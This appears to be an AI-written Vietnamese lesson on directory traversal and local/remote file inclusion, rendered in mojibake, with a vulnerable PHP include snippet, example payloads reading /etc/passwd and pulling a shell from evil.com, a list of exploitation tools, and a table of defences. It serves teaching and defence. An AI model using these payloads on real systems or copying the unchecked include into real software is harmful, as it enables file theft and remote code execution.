DÆ°á»›i Ä‘Ã¢y lÃ  ná»™i dung chi tiáº¿t cho bÃ i há»c:

---

# 06. Directory Traversal & File Inclusion

**Táº¥n cÃ´ng duyá»‡t thÆ° má»¥c vÃ  chÃ¨n táº­p tin**

---

## ğŸ¯ Má»¥c tiÃªu

* Hiá»ƒu cÃ¡ch hoáº¡t Ä‘á»™ng cá»§a Directory Traversal vÃ  File Inclusion (LFI/RFI).
* Khai thÃ¡c Ä‘á»ƒ Ä‘á»c táº­p tin nháº¡y cáº£m, thá»±c thi mÃ£ tá»« xa.
* Biáº¿t cÃ¡ch phÃ²ng chá»‘ng loáº¡i táº¥n cÃ´ng nÃ y trong á»©ng dá»¥ng web.

---

## ğŸ“Œ 1. Directory Traversal lÃ  gÃ¬?

Directory Traversal (Duyá»‡t thÆ° má»¥c) lÃ  táº¥n cÃ´ng nháº±m truy cáº­p cÃ¡c táº­p tin ngoÃ i pháº¡m vi cho phÃ©p báº±ng cÃ¡ch chÃ¨n kÃ½ tá»± Ä‘áº·c biá»‡t vÃ o Ä‘Æ°á»ng dáº«n, vÃ­ dá»¥:

```http
GET /?file=../../../../etc/passwd
```

â†’ MÃ¡y chá»§ Ä‘á»c táº­p tin há»‡ thá»‘ng thay vÃ¬ táº­p tin Ä‘Æ°á»£c phÃ©p.

---

## ğŸ“Œ 2. File Inclusion lÃ  gÃ¬?

File Inclusion lÃ  lá»—i khi á»©ng dá»¥ng **nhÃºng táº­p tin** theo Ä‘áº§u vÃ o tá»« ngÆ°á»i dÃ¹ng, vÃ­ dá»¥:

```php
<?php
  include($_GET['page']);  // page=home.php
?>
```

Náº¿u khÃ´ng kiá»ƒm soÃ¡t ká»¹, káº» táº¥n cÃ´ng cÃ³ thá»ƒ:

* LFI (Local File Inclusion): nhÃºng táº­p tin cá»¥c bá»™ (vÃ­ dá»¥: `/etc/passwd`)
* RFI (Remote File Inclusion): nhÃºng táº­p tin tá»« bÃªn ngoÃ i (chá»‰ xáº£y ra náº¿u `allow_url_include=On`)

---

## ğŸ’¥ 3. CÃ¡c vÃ­ dá»¥ táº¥n cÃ´ng

### ğŸ”¹ LFI:

```
http://site.com/index.php?page=../../../../etc/passwd
```

â†’ TrÃ­ch xuáº¥t thÃ´ng tin há»‡ thá»‘ng.

### ğŸ”¹ RFI (náº¿u server há»— trá»£):

```
http://site.com/index.php?page=http://evil.com/shell.txt
```

â†’ Thá»±c thi mÃ£ tá»« xa.

---

## ğŸ”§ CÃ´ng cá»¥ khai thÃ¡c

* **Burp Suite** (Repeater Ä‘á»ƒ thá»­ nhiá»u payload)
* **wfuzz / ffuf** â€“ fuzz file path
* LFI Suite, Liffy â€“ tool tá»± Ä‘á»™ng hÃ³a
* `curl` hoáº·c trÃ¬nh duyá»‡t

---

## ğŸ›¡ CÃ¡ch phÃ²ng chá»‘ng

| Biá»‡n phÃ¡p                                                           | Giáº£i thÃ­ch                                                           |
| ------------------------------------------------------------------- | -------------------------------------------------------------------- |
| **KhÃ´ng bao giá» Ä‘Æ°a Ä‘Æ°á»ng dáº«n tá»« input ngÆ°á»i dÃ¹ng vÃ o `include()`** | Chá»‰ sá»­ dá»¥ng tÃªn táº­p tin Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a sáºµn                          |
| **Giá»›i háº¡n whitelist táº­p tin**                                      | VÃ­ dá»¥: chá»‰ cho phÃ©p `home.php`, `contact.php`,...                    |
| **Loáº¡i bá» kÃ½ tá»± ../ vÃ  null byte**                                  | TrÃ¡nh truy cáº­p thÆ° má»¥c cha                                           |
| **Cáº¥u hÃ¬nh server Ä‘Ãºng**                                            | Táº¯t `allow_url_include`, khÃ´ng cháº¡y file trong thÆ° má»¥c khÃ´ng tin cáº­y |
| **KhÃ´ng lÆ°u log nháº¡y cáº£m trong web-accessible path**                | TrÃ¡nh Ä‘á»ƒ ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘á»c `/var/log/...`                        |

---

## ğŸ§  Tá»•ng káº¿t

* LFI lÃ  má»™t trong nhá»¯ng lá»— há»•ng nguy hiá»ƒm vÃ¬ cÃ³ thá»ƒ **Ä‘á»c**, **thá»±c thi mÃ£** hoáº·c **chiáº¿m quyá»n Ä‘iá»u khiá»ƒn** mÃ¡y chá»§.
* LuÃ´n kiá»ƒm soÃ¡t ká»¹ dá»¯ liá»‡u ngÆ°á»i dÃ¹ng â€“ Ä‘áº·c biá»‡t lÃ  khi xá»­ lÃ½ Ä‘Æ°á»ng dáº«n vÃ  táº­p tin.

---

Báº¡n cÃ³ muá»‘n tiáº¿p theo lÃ  bÃ i **07. SSRF (Server-Side Request Forgery)** khÃ´ng?
